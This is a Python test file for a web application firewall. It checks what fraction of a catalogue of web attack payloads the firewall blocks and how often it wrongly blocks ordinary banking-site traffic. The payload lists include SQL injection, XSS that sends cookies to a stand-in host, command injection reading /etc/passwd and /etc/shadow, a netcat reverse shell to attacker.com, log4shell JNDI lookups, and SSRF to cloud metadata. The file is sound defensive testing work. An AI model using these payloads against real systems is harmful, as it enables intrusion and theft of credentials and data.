"""
ATTACK COVERAGE MATRIX — what this WAF actually blocks, measured.

Purpose: produce EVIDENCE for the README. No claim about coverage goes in the docs
unless it comes out of this file.

Two populations are measured separately, because conflating them is how WAF vendors
mislead people:
  1. PAYLOAD-BEARING attacks  — a malicious string exists in the request. A WAF can
     see these. Detection rate is meaningful.
  2. STRUCTURAL / LOGIC attacks — the request is syntactically valid and semantically
     malicious (IDOR, CSRF, broken auth, race conditions). NO request-inspection WAF
     can detect these from a single request. We assert they are NOT detected and
     document them as out-of-scope, rather than pretending.

Also measures FALSE POSITIVES on realistic benign traffic — a detector that blocks
everything would score 100% here and be useless.

Run:  python tests/test_attack_coverage.py        (prints the matrix + writes JSON)
"""
from __future__ import annotations
import json, sys
from collections import defaultdict
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from waf.engine import LayeredWAF, BLOCK, HONEYPOT, THROTTLE

WAF = LayeredWAF(expected_hosts={"bank.example.com"})
H = {"Host": "bank.example.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}

# Each probe gets a UNIQUE source IP.
#
# WHY THIS MATTERS: the L3 advanced layer includes a stateful per-IP reputation detector
# (ML_PROBING). If every probe shares one IP, that IP is (correctly) marked hostile after a
# few attacks and then EVERY later request from it is blocked — including the benign controls.
# Measuring that way produced a meaningless "100% detection / 100% false-positive" result.
# Unique IPs isolate PER-REQUEST payload detection, which is what this matrix is measuring.
# IP-reputation escalation is a real, separate feature — measured in test_ip_reputation().
_ip = [0]


def blocked(method="GET", path="/app", query="", body="", headers=None):
    _ip[0] += 1
    src = f"198.51.{(_ip[0] // 250) % 250}.{_ip[0] % 250}"
    d = WAF.evaluate(method, path, query, body, {**H, **(headers or {})}, src)
    return d.action in (BLOCK, HONEYPOT), d


def test_ip_reputation():
    """Separately verify the reputation escalation that unique IPs deliberately bypass."""
    w = LayeredWAF()
    ip = "203.0.113.200"
    for _ in range(12):
        w.evaluate("GET", "/x", "id=1 UNION SELECT pw FROM users--", "", H, ip)
    d = w.evaluate("GET", "/", "", "", H, ip)          # now-benign request, same IP
    return d.action in (BLOCK, HONEYPOT), d


# ═══════════════ 1. PAYLOAD-BEARING ATTACKS (a WAF can see these) ═══════════════
# (category, owasp, [(name, method, path, query, body, headers)])
PAYLOAD_ATTACKS = {
"SQL Injection": ("A03:2021", [
    ("boolean bypass",      "POST", "/login", "", "user=admin' OR '1'='1 -- ", None),
    ("union select",        "GET", "/item", "id=1 UNION SELECT username,password FROM users--", "", None),
    ("stacked query",       "GET", "/item", "id=1; DROP TABLE users--", "", None),
    ("time-based blind",    "GET", "/item", "id=1' AND SLEEP(5)--", "", None),
    ("error-based",         "GET", "/item", "id=1' AND extractvalue(1,concat(0x7e,version()))--", "", None),
    ("out-of-band",         "GET", "/item", "id=1'; exec master..xp_cmdshell 'nslookup evil.com'--", "", None),
    ("comment obfuscation", "GET", "/item", "id=1/**/UNION/**/SELECT/**/pw/**/FROM/**/users", "", None),
    ("hex encoded",         "GET", "/item", "id=0x27204f5220313d31", "", None),
    ("information_schema",  "GET", "/item", "id=1 UNION SELECT table_name FROM information_schema.tables", "", None),
    ("second order",        "POST", "/profile", "", "name=admin'--", None),
]),
"Cross-Site Scripting": ("A03:2021", [
    ("reflected script",    "GET", "/search", "q=<script>alert(document.cookie)</script>", "", None),
    ("img onerror",         "GET", "/search", "q=<img src=x onerror=alert(1)>", "", None),
    ("svg onload",          "GET", "/search", "q=<svg onload=alert(1)>", "", None),
    ("javascript uri",      "GET", "/go", "url=javascript:alert(document.domain)", "", None),
    ("iframe srcdoc",       "GET", "/s", "q=<iframe srcdoc='<script>alert(1)</script>'>", "", None),
    ("body onload",         "GET", "/s", "q=<body onload=alert(1)>", "", None),
    ("event handler attr",  "GET", "/s", "q=<div onmouseover=alert(1)>hover</div>", "", None),
    ("case obfuscation",    "GET", "/s", "q=<ScRiPt>alert(1)</ScRiPt>", "", None),
    ("encoded payload",     "GET", "/s", "q=%3Cscript%3Ealert(1)%3C/script%3E", "", None),
    ("stored via body",     "POST", "/comment", "", "text=<script>fetch('//evil/'+document.cookie)</script>", None),
]),
"Command Injection / RCE": ("A03:2021", [
    ("semicolon chain",     "GET", "/ping", "host=127.0.0.1;cat /etc/passwd", "", None),
    ("pipe chain",          "GET", "/ping", "host=127.0.0.1|whoami", "", None),
    ("backtick",            "GET", "/ping", "host=`id`", "", None),
    ("dollar subshell",     "GET", "/ping", "host=$(id)", "", None),
    ("ampersand",           "GET", "/ping", "host=1.1.1.1 && cat /etc/shadow", "", None),
    ("reverse shell",       "GET", "/x", "c=nc -e /bin/sh attacker.com 4444", "", None),
    ("shellshock",          "GET", "/cgi", "", "() { :;}; /bin/bash -c 'cat /etc/passwd'", None),
    ("python eval",         "POST", "/calc", "", "expr=__import__('os').system('id')", None),
    ("powershell",          "GET", "/x", "c=powershell -enc SQBFAFgA", "", None),
]),
"Path Traversal / LFI": ("A01:2021", [
    ("basic dotdot",        "GET", "/dl", "file=../../../../etc/passwd", "", None),
    ("windows path",        "GET", "/dl", "file=..\\..\\..\\windows\\win.ini", "", None),
    ("url-encoded",         "GET", "/dl", "file=..%2f..%2f..%2fetc%2fpasswd", "", None),
    ("double encoded",      "GET", "/dl", "file=%252e%252e%252fetc%252fpasswd", "", None),
    ("overlong utf8",       "GET", "/dl", "file=%c0%ae%c0%ae%2fetc%2fpasswd", "", None),
    ("null byte",           "GET", "/dl", "file=../../etc/passwd%00.png", "", None),
    ("php wrapper",         "GET", "/dl", "file=php://filter/convert.base64-encode/resource=index.php", "", None),
    ("in path segment",     "GET", "/api/v1/../../../etc/passwd", "", "", None),
]),
"SSRF": ("A10:2021", [
    ("aws metadata",        "GET", "/fetch", "url=http://169.254.169.254/latest/meta-data/iam/", "", None),
    ("gcp metadata",        "GET", "/fetch", "url=http://metadata.google.internal/computeMetadata/v1/", "", None),
    ("localhost",           "GET", "/fetch", "url=http://127.0.0.1:6379/", "", None),
    ("gopher protocol",     "GET", "/fetch", "url=gopher://127.0.0.1:6379/_SET%20k%20v", "", None),
    ("file protocol",       "GET", "/fetch", "url=file:///etc/passwd", "", None),
    ("dns rebind svc",      "GET", "/fetch", "url=http://127.0.0.1.nip.io/", "", None),
    ("internal range",      "GET", "/fetch", "url=http://10.0.0.1/admin", "", None),
]),
"XXE": ("A05:2021", [
    ("classic file read",   "POST", "/xml", "", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', None),
    ("parameter entity",    "POST", "/xml", "", '<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/e.dtd">%p;]><r/>', None),
    ("billion laughs",      "POST", "/xml", "", '<!DOCTYPE b [<!ENTITY a "aa"><!ENTITY b "&a;&a;&a;">]><x>&b;</x>', None),
    ("SVG xxe",             "POST", "/upload", "", '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/passwd">]>&x;</svg>', None),
]),
"SSTI / Expression Injection": ("A03:2021", [
    ("jinja2 math",         "GET", "/p", "name={{7*7}}", "", None),
    ("jinja2 config",       "GET", "/p", "name={{config.items()}}", "", None),
    ("jinja2 rce",          "GET", "/p", "name={{''.__class__.__mro__[1].__subclasses__()}}", "", None),
    ("freemarker",          "GET", "/p", "name=<#assign x='freemarker.template.utility.Execute'?new()>${x('id')}", "", None),
    ("velocity",            "GET", "/p", "name=#set($e='')$e.getClass().forName('java.lang.Runtime')", "", None),
    ("log4shell jndi",      "GET", "/", "x=${jndi:ldap://evil.com/a}", "", None),
    ("spring el",           "GET", "/p", "name=#{T(java.lang.Runtime).getRuntime().exec('id')}", "", None),
    ("struts ognl",         "GET", "/x.action", "q=%{(#cmd='id').(#p=new java.lang.ProcessBuilder(#cmd))}", "", None),
]),
"NoSQL Injection": ("A03:2021", [
    ("gt operator",         "POST", "/login", "", '{"user":{"$gt":""},"pass":{"$gt":""}}', None),
    ("ne operator",         "POST", "/login", "", '{"user":{"$ne":null},"pass":{"$ne":null}}', None),
    ("where js",            "POST", "/api", "", '{"$where":"this.password.length>0"}', None),
    ("regex operator",      "POST", "/api", "", '{"user":{"$regex":"^adm"}}', None),
    ("query param form",    "GET", "/api", "user[$gt]=&pass[$gt]=", "", None),
]),
"LDAP / XPath Injection": ("A03:2021", [
    ("ldap wildcard",       "GET", "/dir", "u=*)(uid=*))(|(uid=*", "", None),
    ("ldap or",             "GET", "/dir", "u=admin)(|(password=*)", "", None),
    ("xpath or",            "GET", "/dir", "u=' or '1'='1", "", None),
    ("xpath extract",       "GET", "/dir", "u=']|//user/*|//['", "", None),
]),
"Deserialization": ("A08:2021", [
    ("java gadget",         "POST", "/api", "", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==", None),
    ("php object",          "GET", "/x", 'data=O:8:"Exploit":1:{s:3:"cmd";s:2:"id";}', "", None),
    ("python pickle",       "POST", "/api", "", "cos\nsystem\n(S'id'\ntR.", None),
    ("dotnet losformatter",  "POST", "/api", "", "AAEAAAD/////AQAAAAAAAAAMAgAAAF", None),
]),
"Prototype Pollution": ("A08:2021", [
    ("__proto__ body",      "POST", "/api", "", '{"__proto__":{"isAdmin":true}}', None),
    ("__proto__ query",     "GET", "/api", "__proto__[isAdmin]=true", "", None),
    ("constructor",         "GET", "/api", "constructor[prototype][isAdmin]=true", "", None),
]),
"CRLF / Response Splitting": ("A03:2021", [
    ("set-cookie inject",   "GET", "/r", "u=%0d%0aSet-Cookie:%20session=hijacked", "", None),
    ("header split",        "GET", "/r", "u=test%0d%0aX-Injected:%20true", "", None),
    ("log injection",       "GET", "/r", "u=test%0aFAKE%20LOG%20ENTRY", "", None),
]),
"Open Redirect": ("A01:2021", [
    ("protocol relative",   "GET", "/go", "next=//evil.example.com", "", None),
    ("absolute url",        "GET", "/go", "next=http://evil.example.com/phish", "", None),
    ("backslash bypass",    "GET", "/go", "next=/\\evil.example.com", "", None),
]),
"JWT Attacks": ("A07:2021", [
    ("alg none",            "GET", "/api", "token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.", "", None),
    ("jku header",          "POST", "/api", "", '{"alg":"RS256","jku":"http://evil.com/keys.json"}', None),
    ("x5u header",          "POST", "/api", "", '{"alg":"RS256","x5u":"http://evil.com/c.pem"}', None),
]),
"GraphQL Abuse": ("A05:2021", [
    ("introspection",       "POST", "/graphql", "", '{"query":"{__schema{types{name fields{name}}}}"}', None),
    ("batch dos",           "POST", "/graphql", "", '[{"query":"{a}"},{"query":"{a}"},{"query":"{a}"},{"query":"{a}"}]', None),
]),
"Scanner / Recon": ("A05:2021", [
    ("sqlmap UA",           "GET", "/", "", "", {"User-Agent": "sqlmap/1.7.2#stable"}),
    ("nikto UA",            "GET", "/", "", "", {"User-Agent": "Mozilla/5.00 (Nikto/2.1.6)"}),
    ("nmap UA",             "GET", "/", "", "", {"User-Agent": "Nmap Scripting Engine"}),
    ("admin probe",         "GET", "/admin/config.php.bak", "", "", None),
    ("git exposure",        "GET", "/.git/config", "", "", None),
    ("env exposure",        "GET", "/.env", "", "", None),
]),
"Host Header / Cache Poisoning": ("A05:2021", [
    ("host injection",      "GET", "/", "", "", {"Host": "evil.example.com"}),
    ("x-forwarded-host",    "GET", "/", "", "", {"X-Forwarded-Host": "evil.example.com"}),
]),
"HTTP Request Smuggling": ("A05:2021", [
    ("CL.TE",               "POST", "/", "", "0\r\n\r\nGET /admin HTTP/1.1\r\n", {"Transfer-Encoding": "chunked"}),
]),
}

# ═══════════════ 2. STRUCTURAL / LOGIC ATTACKS (NO WAF can see these) ═══════════════
# We assert these are NOT detected — and document them as out-of-scope honestly.
LOGIC_ATTACKS = {
"Broken Access Control (IDOR)": ("A01:2021",
    "GET /api/orders/1002 by user who owns 1001 — syntactically identical to a legitimate request",
    ("GET", "/api/orders/1002", "", "")),
"CSRF": ("A01:2021",
    "A valid state-changing request with a valid session, initiated cross-origin",
    ("POST", "/transfer", "", "to=attacker&amount=5000")),
"Mass assignment": ("A04:2021",
    "Extra field in an otherwise valid JSON body",
    ("POST", "/api/users", "", '{"name":"bob","email":"b@x.com","role":"admin"}')),
"Price/parameter tampering": ("A04:2021",
    "Valid number, wrong business meaning",
    ("POST", "/checkout", "", '{"sku":"NB-1042","qty":1,"price":0.01}')),
"Credential stuffing (single req)": ("A07:2021",
    "One valid login attempt — only detectable across many requests, not one",
    ("POST", "/login", "", "username=john.doe&password=Summer2024!")),
"Race condition / TOCTOU": ("A04:2021",
    "Two identical valid requests sent concurrently",
    ("POST", "/redeem", "", "coupon=SAVE10")),
"Weak password / auth policy": ("A07:2021",
    "A valid registration with a weak password",
    ("POST", "/register", "", "username=newuser&password=123456")),
}

# ═══════════════ 3. BENIGN CONTROL (FP measurement) ═══════════════
BENIGN = [
    ("GET", "/", "", ""),
    ("GET", "/search", "q=high yield savings account", ""),
    ("GET", "/products", "category=electronics&brand=apple&sort=price&page=2", ""),
    ("GET", "/articles/how-to-budget-2026", "ref=homepage&utm_source=newsletter", ""),
    ("POST", "/login", "", '{"username":"john.doe","password":"hunter2"}'),
    ("POST", "/cart/add", "", '{"sku":"NB-1042","qty":2}'),
    ("GET", "/api/v2/users/48213", "fields=name,email,avatar", ""),
    ("GET", "/transfer", "to=jane.smith&amt=100&note=monthly rent", ""),
    ("GET", "/help/wire-transfer-times", "", ""),
    ("GET", "/statements", "period=last-90-days&format=pdf", ""),
    ("PUT", "/api/v2/profile", "", '{"email":"maria+news@gmail.com","newsletter":true}'),
    ("GET", "/branch-locator", "q=branches near 94103", ""),
    ("GET", "/faq", "topic=mortgage-rates", ""),
    ("POST", "/support/ticket", "", '{"subject":"Card declined","body":"My card was declined at a shop yesterday."}'),
    ("GET", "/assets/app.min.js", "v=8f3a2b", ""),
]


def main():
    print("=" * 104)
    print("ATTACK COVERAGE MATRIX — measured, not claimed")
    print("=" * 104)

    results, total_hit, total_n = {}, 0, 0
    print(f"\n{'CATEGORY':<34}{'OWASP':<12}{'DETECTED':<12}{'RATE':<9}MISSES")
    print("-" * 104)
    for cat, (owasp, cases) in PAYLOAD_ATTACKS.items():
        hits, misses = 0, []
        for name, m, p, q, b, h in cases:
            ok, d = blocked(m, p, q, b, h)
            hits += ok
            if not ok:
                misses.append(name)
        n = len(cases); total_hit += hits; total_n += n
        rate = hits / n
        results[cat] = {"owasp": owasp, "detected": hits, "total": n,
                        "rate": round(rate, 3), "misses": misses}
        flag = "" if rate == 1 else ("  [WARN]" if rate >= .7 else "  [LOW]")
        print(f"{cat:<34}{owasp:<12}{f'{hits}/{n}':<12}{rate*100:>5.0f}%{flag}   {', '.join(misses[:3])}")

    print("-" * 104)
    print(f"{'PAYLOAD-BEARING TOTAL':<34}{'':<12}{f'{total_hit}/{total_n}':<12}{total_hit/total_n*100:>5.1f}%")

    # logic attacks — expected NOT detected
    print(f"\n{'STRUCTURAL / LOGIC ATTACK':<40}{'OWASP':<12}{'DETECTED?':<12}VERDICT")
    print("-" * 104)
    logic = {}
    for name, (owasp, why, (m, p, q, b)) in LOGIC_ATTACKS.items():
        ok, _ = blocked(m, p, q, b)
        logic[name] = {"owasp": owasp, "detected": bool(ok), "why": why}
        print(f"{name:<40}{owasp:<12}{('YES' if ok else 'no'):<12}"
              f"{'(out of scope — no payload signal)' if not ok else '(incidental)'}")

    # benign FP
    fp_cases = [(p, blocked(m, p, q, b)) for m, p, q, b in BENIGN]
    fp = sum(1 for _, (ok, _) in fp_cases if ok)
    fpr = fp / len(BENIGN)
    print(f"\n{'BENIGN CONTROL':<40}{'':<12}{f'{fp}/{len(BENIGN)}':<12}false-positive rate {fpr*100:.1f}%")
    for p, (ok, d) in fp_cases:
        if ok:
            print(f"    FP: {p:<34} layer={d.layer} cat={d.category}")

    # IP reputation (measured separately — unique IPs above deliberately bypass it)
    rep_ok, rep_d = test_ip_reputation()
    print(f"\n{'IP REPUTATION ESCALATION':<40}{'':<12}{('WORKS' if rep_ok else 'NOT ACTIVE'):<12}"
          f"benign request from an IP after 12 attacks -> {rep_d.action} ({rep_d.layer})")

    out = {"payload_bearing": results,
           "ip_reputation_escalation": bool(rep_ok),
           "payload_total": {"detected": total_hit, "total": total_n, "rate": round(total_hit/total_n, 4)},
           "logic_attacks_out_of_scope": logic,
           "benign_false_positive_rate": round(fpr, 4), "benign_n": len(BENIGN)}
    (ROOT / "models_v2" / "attack_coverage.json").write_text(json.dumps(out, indent=2))

    print("\n" + "=" * 104)
    print(f"VERDICT: {total_hit}/{total_n} payload-bearing attacks blocked ({total_hit/total_n*100:.1f}%) "
          f"at {fpr*100:.1f}% benign FP")
    print(f"         {sum(1 for v in logic.values() if not v['detected'])}/{len(logic)} logic attacks "
          f"correctly identified as OUT OF SCOPE (no WAF can see them)")
    print("=" * 104)
    print("wrote models_v2/attack_coverage.json")


if __name__ == "__main__":
    main()
